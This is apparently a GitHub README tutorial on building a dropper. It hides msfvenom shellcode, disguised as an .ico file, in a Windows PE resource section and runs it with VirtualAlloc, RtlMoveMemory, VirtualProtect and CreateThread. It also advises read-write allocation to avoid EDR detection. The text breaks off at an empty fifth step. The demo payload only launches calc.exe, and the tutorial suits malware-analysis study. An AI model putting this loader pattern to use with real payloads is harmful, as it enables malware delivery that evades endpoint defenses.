# DropperResourceSection
where the Dropper is saved in the resource Section


Which sections of the PE we can put our code into


Today Lets try to understand different sections where the malicious payload or we can place the code or shellcode in the PE file.

PE has many sections , but her we would be concentrating on main three sections. Which are ...  

1. .text
2. .data
3. .rsrc

To do that lets create a simple code which helps us to understand more , for this we need visual studio (or gcc compiler being installed and use it to compile and create an exe file to run) and x64dbg
https://x64dbg.com/ to download the x64dbg debugger and installation is simple 

![image](https://github.com/user-attachments/assets/f97d1670-b7cb-4668-ad9d-2ac625eadeb4)

It's just a simple diagram which shows the different sections we would be seeing in the PE file.

so we shall first discuss on steps 
1. what API methods are used to allocate a space in the process memory  
2. move our payload into the virtually allocated memory  
3. Then how to provide the permissions after that we can also see the x64dbg being used to see the payload placement.
4. Create a Threat inside the current Process. 


VirutallAlloc is an API which is defined in Kernel32.dll, which allocates a memory in the process we mention

		void * exec_memory;
		
		LPVOID VirtualAlloc( 		
		  LPVOID lpAddress,                // Starting address from which the allacotion should happen , exmple a memory  
		  SIZE_T dwSize,                  // Size of the memory to be allocated   
		  DWORD  flAllocationType,        // What kind of allocation for the memory to be allocated like MEM_COMMIT, MEM_RESERVE 
		  DWORD  flProtect                // Memory Protection to be allocated PAGE_EXECUTE , PAGE_READWRITE etc 
		  );  


Sample line of code =>  

	exec_memory = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);  
 
 Here we are allocting the memory from 0 address until payload_len, we are having a allocation type as MEM_COMMIT and MEM_RESERVE and giving the permission as PAGE_READWRITE just to avoid the EDR triggering as suspicious if the allocated memory is given directly as PAGE_EXECUTE  

We can find more detailed information in the link [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

Next API Used is RtlMoveMemory, which is used to copy the payload from Source to Destination

		VOID RtlMoveMemory( 		
		  VOID UNALIGNED *Destination,   // Where to move the memory  
		  const VOID UNALIGNED *Source,   // From where to move the payload 
		  SIZE_T         Length           //size of the payload  
		  );  


Sample line of code =>  

	RtlMoveMemory(exec_memory, payload, payload_len); 
 
Here the payload is moved to address pointed or allocated from the VirtualAlloc API  

We can find more detailed information in the link [RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)

Next API is VirtualProtect, which Changes the protection on a region of committed pages in the virtual address space of the calling process.

		BOOL VirtualProtect(		
		  [in]  LPVOID lpAddress,    // Source address or address to which we need to change the protection or permission  
		  [in]  SIZE_T dwSize,       // Size of the memory to change the protect
		  [in]  DWORD  flNewProtect, // New Protection we apply from the old protection
		  [out] PDWORD lpflOldProtect // A pointer to a variable that receives the previous access protection value, that is initial page 
		  );  

Sample line of code => 

	rv = VirtualProtect(exec_memory, payload_len, PAGE_EXECUTE_READ, &oldprotect);  
 
 the exec_mem which has the payload or pointing to the payload had a protection PAGE_READWRITE initially and now its being changed to PAGE_EXECUTE_READ

We can find more detailed information in the link [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

Next API would be CreateThread, which creates thread in the process 

	HANDLE CreateThread(  
	  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,     // A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes.  
	  [in]            SIZE_T                  dwStackSize,    // The initial size of the stack, in bytes  
	  [in]            LPTHREAD_START_ROUTINE  lpStartAddress, //   This pointer represents the starting address of the thread  
	  [in, optional]  __drv_aliasesMem LPVOID lpParameter,    //  A pointer to a variable to be passed to the thread.  
	  [in]            DWORD                   dwCreationFlags,  // The flags that control the creation of the thread  
	  [out, optional] LPDWORD                 lpThreadId   //  A pointer to a variable that receives the thread identifier  
	);   

Sample line of code => 

	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_memory, 0, 0, 0); 
 
 LPTHREAD_START_ROUTINE  Points to a function that notifies the host that a thread has started to execute and exec_mem start of payload to start

We can find more detailed information in the link [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)


Now lets try to understand how to use the resource , here we have calc.ico which is the payload which we insert into the rsrc section. 

1. Lets see how to generate that , for this i am using msfvenom to generate a shellcode which launches the calc.exe on windows and output is bin file. 

   		msfvenom -p windows/exec CMD=calc.exe -f raw -o calc_shellcode.bin

   we are generate a raw ouptut , the -p represents the command which is windows/exec with the input CMD=calc.exe , -f indicates the format of the output which is in raw format and -o indicates the output file and here we have clac_shellcode.bin as output

2. Lets take the input and run a python code named bintoico.py and it genrates the calc.ico, the code does the simple work of reading the file in binary format (rb) and add the header details to make it the ico format
   
3. Now we create two files resource.h and resource.rc
     a. The resource.h consisit of the code , which just define the CALC_ICO  equal to 100. We consider this as resource identifier for our example
   
   		#define CALC_ICO 100

     b. The resource.rc file consist of the statement.

		#include "resources.h"
		CALC_ICO RCDATA calc.ico


    The value "RCDATA" indicates i am creating a binary format data and naming it as CALC_ICO and the file is calc.ico (we can provide the specific path , since the file is in 
    the current directory, provided the name)

4. Lets check on how to compile them and keep them in PE so the PE can refer it later and place them in the rsrc section
5. 
